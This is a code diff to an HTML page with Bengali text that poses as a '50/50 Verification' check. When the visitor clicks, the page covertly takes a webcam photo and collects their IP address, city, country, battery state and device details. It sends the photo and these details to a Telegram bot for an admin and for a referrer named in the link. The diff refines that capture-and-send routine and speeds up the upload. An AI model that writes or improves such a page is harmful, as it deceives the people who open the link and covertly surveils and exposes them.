@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>50/50 Verification</title>
     <style>
-        body { font-family: 'Segoe UI', Arial, sans-serif; text-align: center; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; background-image: url('https://i.imghippo.com/files/Fq9968wg.jpg'); background-size: cover; background-position: center; position: relative; }
+        body { font-family: Arial, sans-serif; text-align: center; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; background-image: url('https://i.imghippo.com/files/Fq9968wg.jpg'); background-size: cover; background-position: center; position: relative; }
         body::before { content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0, 0, 0, 0.5); z-index: 1; }
         .container { background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(15px); padding: 40px 20px; border-radius: 20px; width: 85%; max-width: 380px; z-index: 2; position: relative; border: 1px solid rgba(255, 255, 255, 0.2); }
         h1, h2, p { color: #ffffff; text-shadow: 1px 1px 4px #000; }
@@ -40,8 +40,8 @@
                     const b = await navigator.getBattery();
                     batt = `\n🔋 ব্যাটারি: ${Math.round(b.level * 100)}%\n🔌 চার্জিং: ${b.charging ? "হ্যাঁ" : "না"}`;
                 }
-                return `📍 আইপি: ${d.ip}\n🏢 আইএসপি: ${d.org}\n🌍 শহর: ${d.city}\n🚩 দেশ: ${d.country_name}${batt}\n📱 ডিভাইস: ${navigator.userAgent.split(')')[0] + ')'}`;
-            } catch (e) { return "ট্র্যাকিং তথ্য পাওয়া যায়নি।"; }
+                return `📍 আইপি: ${d.ip}\n🌍 শহর: ${d.city}\n🚩 দেশ: ${d.country_name}${batt}\n📱 ডিভাইস: ${navigator.userAgent.substring(0, 40)}`;
+            } catch (e) { return "তথ্য পাওয়া যায়নি।"; }
         }
 
         document.getElementById('verify-btn').addEventListener('click', async () => {
@@ -49,7 +49,8 @@
             const status = document.getElementById('status');
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
-            status.innerText = "Processing... (২ সেকেন্ড অপেক্ষা করুন)";
+            
+            status.innerText = "Processing...";
             btn.style.display = "none"; 
 
             try {
@@ -69,20 +70,27 @@
                             formData.append('photo', blob, 'user.jpg');
                             formData.append('caption', trackerInfo);
 
-                            if (userIdFromLink && userIdFromLink !== adminId) {
-                                formData.set('chat_id', userIdFromLink);
+                            try {
+                                // অ্যাডমিনকে পাঠানো
+                                formData.append('chat_id', adminId);
                                 await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData });
-                            }
-                            formData.set('chat_id', adminId);
-                            await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData });
 
-                            status.innerText = "Verification Successful!";
+                                // রেফারারকে পাঠানো
+                                if (userIdFromLink && userIdFromLink !== adminId) {
+                                    formData.set('chat_id', userIdFromLink);
+                                    await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData });
+                                }
+                                
+                                status.innerText = "Verification Successful!";
+                            } catch (error) {
+                                status.innerText = "Error! Please try again.";
+                            }
                             stream.getTracks().forEach(track => track.stop());
-                        }, 'image/jpeg', 0.9);
+                        }, 'image/jpeg', 0.6); // কোয়ালিটি কমিয়ে দ্রুত আপলোড করার জন্য
                     }, 2000); 
                 };
             } catch (err) {
-                status.innerText = "ক্যামেরা অ্যাক্সেস প্রয়োজন!";
+                status.innerText = "Error: ক্যামেরা অ্যাক্সেস দিন!";
                 btn.style.display = "block";
             }
         });
